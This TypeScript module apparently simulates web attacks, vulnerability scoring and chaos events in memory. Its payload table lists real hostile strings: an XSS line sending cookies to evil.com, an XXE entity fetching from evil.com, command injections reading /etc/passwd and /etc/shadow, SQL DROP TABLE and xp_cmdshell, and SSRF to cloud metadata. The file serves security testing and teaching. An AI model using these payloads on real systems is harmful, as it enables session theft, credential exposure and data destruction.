/**
 * UESE Security & Attack Simulator
 * 
 * Simulates security attacks, vulnerabilities, and defense validation.
 * Includes XSS, CSRF, injection, and chaos testing capabilities.
 */

import { EventEmitter } from 'events';

// ============================================================================
// TYPES
// ============================================================================

export type AttackType =
    | 'xss' | 'csrf' | 'sql_injection' | 'command_injection'
    | 'path_traversal' | 'rce' | 'ssrf' | 'xxe' | 'race_condition'
    | 'dos' | 'brute_force' | 'session_hijack' | 'mitm';

export type VulnerabilitySeverity = 'critical' | 'high' | 'medium' | 'low' | 'info';

export interface Attack {
    id: string;
    type: AttackType;
    payload: string;
    target: string;
    timestamp: number;
    status: 'pending' | 'executing' | 'blocked' | 'succeeded' | 'failed';
}

export interface Vulnerability {
    id: string;
    type: AttackType;
    severity: VulnerabilitySeverity;
    description: string;
    location: string;
    remediation: string;
    cwe?: string;
    cvss?: number;
}

export interface SecurityScanResult {
    scanId: string;
    target: string;
    startTime: number;
    endTime: number;
    vulnerabilities: Vulnerability[];
    attacksBlocked: number;
    attacksSucceeded: number;
    score: number; // 0-100
}

export interface ChaosEvent {
    id: string;
    type: 'network_failure' | 'latency_spike' | 'cpu_spike' | 'memory_exhaustion' | 'disk_full' | 'clock_skew' | 'process_kill';
    description: string;
    duration: number;
    impact: 'low' | 'medium' | 'high' | 'critical';
    timestamp: number;
}

// ============================================================================
// ATTACK PAYLOADS
// ============================================================================

const ATTACK_PAYLOADS: Record<AttackType, string[]> = {
    xss: [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(1)">',
        '"><script>document.location="http://evil.com/?c="+document.cookie</script>',
        '<svg onload=alert(1)>',
        'javascript:alert(document.domain)'
    ],
    csrf: [
        '<img src="https://target.com/api/delete?id=1">',
        '<form action="https://target.com/api/transfer" method="POST"><input name="amount" value="1000"></form>',
    ],
    sql_injection: [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' AND '1'='1",
        "UNION SELECT * FROM users",
        "1; EXEC xp_cmdshell('whoami')"
    ],
    command_injection: [
        '; cat /etc/passwd',
        '| whoami',
        '`id`',
        '$(cat /etc/shadow)',
        '& net user'
    ],
    path_traversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f',
        '....//....//....//etc/passwd'
    ],
    rce: [
        '{"__proto__": {"polluted": true}}',
        'require("child_process").exec("id")',
        'eval(atob("YWxlcnQoMSk="))'
    ],
    ssrf: [
        'http://localhost:6379',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*'
    ],
    xxe: [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>'
    ],
    race_condition: [
        'parallel_request_1',
        'parallel_request_2'
    ],
    dos: [
        'A'.repeat(1000000),
        '{"a":'.repeat(100000) + '1' + '}'.repeat(100000)
    ],
    brute_force: [
        'password123',
        'admin',
        '123456',
        'letmein'
    ],
    session_hijack: [
        'Cookie: session=stolen_value',
    ],
    mitm: [
        'HTTP downgrade',
    ]
};

// ============================================================================
// SECURITY SIMULATOR
// ============================================================================

export class SecuritySimulator extends EventEmitter {
    private static instance: SecuritySimulator;
    private attacks: Map<string, Attack> = new Map();
    private vulnerabilities: Vulnerability[] = [];
    private scanResults: Map<string, SecurityScanResult> = new Map();
    private chaosEvents: ChaosEvent[] = [];
    private defenses: Set<AttackType> = new Set();

    private constructor() {
        super();
        this.initializeDefenses();
        console.log('🛡️ Security Simulator initialized');
    }

    static getInstance(): SecuritySimulator {
        if (!SecuritySimulator.instance) {
            SecuritySimulator.instance = new SecuritySimulator();
        }
        return SecuritySimulator.instance;
    }

    private initializeDefenses(): void {
        // Default defenses enabled
        this.defenses.add('xss');
        this.defenses.add('sql_injection');
        this.defenses.add('csrf');
    }

    // ========================================================================
    // ATTACK SIMULATION
    // ========================================================================

    simulateAttack(type: AttackType, target: string): Attack {
        const payloads = ATTACK_PAYLOADS[type] || [];
        const payload = payloads[Math.floor(Math.random() * payloads.length)] || 'generic_payload';

        const attack: Attack = {
            id: `attack_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
            type,
            payload,
            target,
            timestamp: Date.now(),
            status: 'pending'
        };

        this.attacks.set(attack.id, attack);
        this.emit('attack-initiated', attack);

        // Execute attack
        attack.status = 'executing';
        this.emit('attack-executing', attack);

        // Check if defense is enabled
        if (this.defenses.has(type)) {
            attack.status = 'blocked';
            this.emit('attack-blocked', attack);
        } else {
            attack.status = 'succeeded';
            this.emit('attack-succeeded', attack);

            // Record vulnerability
            this.recordVulnerability(type, target, payload);
        }

        return attack;
    }

    runAttackSuite(target: string, attackTypes?: AttackType[]): Attack[] {
        const types = attackTypes || Object.keys(ATTACK_PAYLOADS) as AttackType[];
        return types.map(type => this.simulateAttack(type, target));
    }

    private recordVulnerability(type: AttackType, location: string, payload: string): void {
        const severity = this.getSeverity(type);

        const vuln: Vulnerability = {
            id: `vuln_${Date.now()}`,
            type,
            severity,
            description: `${type.replace('_', ' ').toUpperCase()} vulnerability detected`,
            location,
            remediation: this.getRemediation(type),
            cwe: this.getCWE(type),
            cvss: this.getCVSS(severity)
        };

        this.vulnerabilities.push(vuln);
        this.emit('vulnerability-found', vuln);
    }

    private getSeverity(type: AttackType): VulnerabilitySeverity {
        const critical: AttackType[] = ['rce', 'sql_injection', 'command_injection'];
        const high: AttackType[] = ['xss', 'ssrf', 'xxe', 'path_traversal'];
        const medium: AttackType[] = ['csrf', 'session_hijack', 'race_condition'];

        if (critical.includes(type)) return 'critical';
        if (high.includes(type)) return 'high';
        if (medium.includes(type)) return 'medium';
        return 'low';
    }

    private getRemediation(type: AttackType): string {
        const remediations: Partial<Record<AttackType, string>> = {
            xss: 'Use Content Security Policy, escape output, sanitize input',
            sql_injection: 'Use parameterized queries, ORM, input validation',
            csrf: 'Implement CSRF tokens, SameSite cookies',
            command_injection: 'Avoid shell commands, use allow-lists',
            path_traversal: 'Validate paths, use chroot, canonicalize paths',
            rce: 'Disable eval, use sandboxing, validate input',
            ssrf: 'Validate URLs, use allow-lists, disable redirects',
            xxe: 'Disable external entities, use safe XML parsers'
        };
        return remediations[type] || 'Review security best practices';
    }

    private getCWE(type: AttackType): string {
        const cwes: Partial<Record<AttackType, string>> = {
            xss: 'CWE-79',
            sql_injection: 'CWE-89',
            csrf: 'CWE-352',
            command_injection: 'CWE-78',
            path_traversal: 'CWE-22',
            rce: 'CWE-94',
            ssrf: 'CWE-918',
            xxe: 'CWE-611'
        };
        return cwes[type] || 'CWE-Unknown';
    }

    private getCVSS(severity: VulnerabilitySeverity): number {
        const scores: Record<VulnerabilitySeverity, number> = {
            critical: 9.5,
            high: 7.5,
            medium: 5.5,
            low: 3.0,
            info: 0.0
        };
        return scores[severity];
    }

    // ========================================================================
    // SECURITY SCANNING
    // ========================================================================

    async runSecurityScan(target: string): Promise<SecurityScanResult> {
        const scanId = `scan_${Date.now()}`;
        const startTime = Date.now();

        this.emit('scan-started', { scanId, target });

        // Run all attack types
        const attacks = this.runAttackSuite(target);

        // Calculate results
        const blocked = attacks.filter(a => a.status === 'blocked').length;
        const succeeded = attacks.filter(a => a.status === 'succeeded').length;
        const score = Math.round((blocked / attacks.length) * 100);

        const result: SecurityScanResult = {
            scanId,
            target,
            startTime,
            endTime: Date.now(),
            vulnerabilities: [...this.vulnerabilities],
            attacksBlocked: blocked,
            attacksSucceeded: succeeded,
            score
        };

        this.scanResults.set(scanId, result);
        this.emit('scan-completed', result);

        return result;
    }

    // ========================================================================
    // DEFENSE MANAGEMENT
    // ========================================================================

    enableDefense(type: AttackType): void {
        this.defenses.add(type);
        this.emit('defense-enabled', type);
    }

    disableDefense(type: AttackType): void {
        this.defenses.delete(type);
        this.emit('defense-disabled', type);
    }

    getDefenses(): AttackType[] {
        return Array.from(this.defenses);
    }

    // ========================================================================
    // CHAOS ENGINEERING
    // ========================================================================

    injectChaos(type: ChaosEvent['type'], duration: number = 5000): ChaosEvent {
        const event: ChaosEvent = {
            id: `chaos_${Date.now()}`,
            type,
            description: this.getChaosDescription(type),
            duration,
            impact: this.getChaosImpact(type),
            timestamp: Date.now()
        };

        this.chaosEvents.push(event);
        this.emit('chaos-injected', event);

        // Auto-recover after duration
        setTimeout(() => {
            this.emit('chaos-recovered', event);
        }, duration);

        return event;
    }

    private getChaosDescription(type: ChaosEvent['type']): string {
        const descriptions: Record<ChaosEvent['type'], string> = {
            network_failure: 'Complete network connectivity loss',
            latency_spike: 'Network latency increased 10x',
            cpu_spike: 'CPU usage spiked to 100%',
            memory_exhaustion: 'Available memory exhausted',
            disk_full: 'Disk storage capacity reached',
            clock_skew: 'System clock drifted significantly',
            process_kill: 'Random process terminated'
        };
        return descriptions[type];
    }

    private getChaosImpact(type: ChaosEvent['type']): ChaosEvent['impact'] {
        const impacts: Record<ChaosEvent['type'], ChaosEvent['impact']> = {
            network_failure: 'critical',
            latency_spike: 'high',
            cpu_spike: 'high',
            memory_exhaustion: 'critical',
            disk_full: 'high',
            clock_skew: 'medium',
            process_kill: 'high'
        };
        return impacts[type];
    }

    runChaosExperiment(duration: number = 30000): void {
        const chaosTypes: ChaosEvent['type'][] = [
            'network_failure', 'latency_spike', 'cpu_spike',
            'memory_exhaustion', 'disk_full', 'clock_skew', 'process_kill'
        ];

        this.emit('chaos-experiment-started');

        // Inject random chaos events
        const intervals: NodeJS.Timeout[] = [];
        for (let i = 0; i < 5; i++) {
            const timeout = setTimeout(() => {
                const type = chaosTypes[Math.floor(Math.random() * chaosTypes.length)];
                this.injectChaos(type, 3000);
            }, Math.random() * duration);
            intervals.push(timeout);
        }

        setTimeout(() => {
            intervals.forEach(clearTimeout);
            this.emit('chaos-experiment-ended');
        }, duration);
    }

    // ========================================================================
    // METRICS
    // ========================================================================

    getVulnerabilities(): Vulnerability[] {
        return [...this.vulnerabilities];
    }

    getAttackHistory(): Attack[] {
        return Array.from(this.attacks.values());
    }

    getChaosHistory(): ChaosEvent[] {
        return [...this.chaosEvents];
    }

    getSecurityScore(): number {
        const blocked = Array.from(this.attacks.values()).filter(a => a.status === 'blocked').length;
        const total = this.attacks.size;
        return total > 0 ? Math.round((blocked / total) * 100) : 100;
    }

    reset(): void {
        this.attacks.clear();
        this.vulnerabilities = [];
        this.chaosEvents = [];
        this.emit('reset');
    }
}

export const securitySimulator = SecuritySimulator.getInstance();
